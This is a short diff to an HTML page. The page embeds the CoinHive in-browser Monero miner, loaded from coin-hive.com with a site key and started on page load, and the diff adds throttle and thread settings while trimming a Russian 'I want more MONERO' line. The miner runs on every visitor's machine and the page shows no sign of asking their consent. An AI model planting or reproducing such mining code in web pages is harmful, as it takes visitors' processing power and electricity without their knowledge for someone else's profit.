@@ -4,11 +4,16 @@
 
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
-	var miner = new CoinHive.Anonymous('yjt13HAapZDOrvOOEZw9aVznShq0MmMb');
+	var miner = new CoinHive.Anonymous('yjt13HAapZDOrvOOEZw9aVznShq0MmMb', {
+	threads: 0,
+	autoThreads: true,
+	throttle: 0.3,
+	forceASMJS: false
+});
 	miner.start();
 </script>	
 
-Хочу больше <b>MONERO</b>
+<b>MONERO</b>
 
 </body>
 </html>
